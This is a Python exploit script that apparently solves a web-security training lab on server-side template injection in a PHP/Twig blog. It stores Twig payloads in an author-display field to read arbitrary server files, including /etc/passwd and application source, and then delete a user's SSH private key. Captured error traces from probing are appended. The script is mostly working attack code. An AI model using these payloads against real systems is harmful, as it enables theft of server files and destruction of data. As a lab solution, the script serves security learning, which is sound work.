# Lab: Server-side template injection with a custom exploit
# difficulty: expert

import requests
import re

sub = '0a5f00d404c693ac8065e9f800100023'
url = f'https://{sub}.web-security-academy.net'
headers = {
    'Cookie': 'session=oD3AsFFWBT6VnAtwZhcPKr4KoiT2M8p3'
}
csrf = 'mkCMhP6qMinsHFagBjuAGVhnKj8zPTIJ'

def comment():
    body = {
        'csrf': csrf,
        'postId': 2,
        'comment': 'cawk'
    }
    endpoint = '/post/comment'
    r = requests.post(url + endpoint, headers=headers, data=body)

def fileDisclosure(path='/etc/passwd', filename='passwd'):
    # can't use filter(), reduce(), map(), file_excerpt(), dump()
    payload = f"user.setAvatar('{path}', 'image/jpeg')"
    body = {
        'csrf': csrf,
        'blog-post-author-display': payload
    }
    endpoint = '/my-account/change-blog-post-author-display'
    requests.post(url + endpoint, headers=headers, data=body) # stored SSTI

    endpoint = '/post?postId=2'
    r = requests.get(url + endpoint, headers=headers)  # trigger SSTI

    endpoint = '/avatar?avatar=wiener'
    r = requests.get(url + endpoint, headers=headers)   # get SSTI result

    with open(filename, 'wb') as f:
        f.write(r.content)

def finalExploit():
    # can't use filter(), reduce(), map(), file_excerpt(), dump()
    payload = "user.gdprDelete('/home/carlos/.ssh/id_rsa', 'image/jpeg')"
    body = {
        'csrf': csrf,
        'blog-post-author-display': payload
    }
    endpoint = '/my-account/change-blog-post-author-display'
    requests.post(url + endpoint, headers=headers, data=body) # stored SSTI

    endpoint = '/post?postId=2'
    r = requests.get(url + endpoint, headers=headers)  # trigger SSTI

if __name__ == '__main__':
    comment()
    fileDisclosure('/home/carlos/User.php', 'User.php')
    finalExploit()



# avatar file upload using pdf 
'''
PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: application/pdf in /home/carlos/User.php:28
Stack trace:
#0 /home/carlos/avatar_upload.php(19): User->setAvatar('/tmp/some.pdf', 'application/pdf')
#1 {main}
  thrown in /home/carlos/User.php on line 28
'''

# {{7*7}}
'''
Internal Server Error

PHP Fatal error: Uncaught Twig_Error_Syntax: Unexpected token "punctuation" of value "{" ("end of print statement" expected) in "index" at line 1. in /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/TokenStream.php:80 Stack trace: #0 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Parser.php(126): Twig_TokenStream->expect(4) #1 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Parser.php(81): Twig_Parser->subparse(NULL, false) #2 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php(533): Twig_Parser->parse(Object(Twig_TokenStream)) #3 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php(565): Twig_Environment->parse(Object(Twig_TokenStream)) #4 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php(368): Twig_Environment->compileSource(Object(Twig_Source)) #5 /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php(289): Twig_Environment->loadTemplate('index') #6 Command line code(10): Twig_Environment->render('index', Array) #7 in /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/TokenStream.php on line 80
'''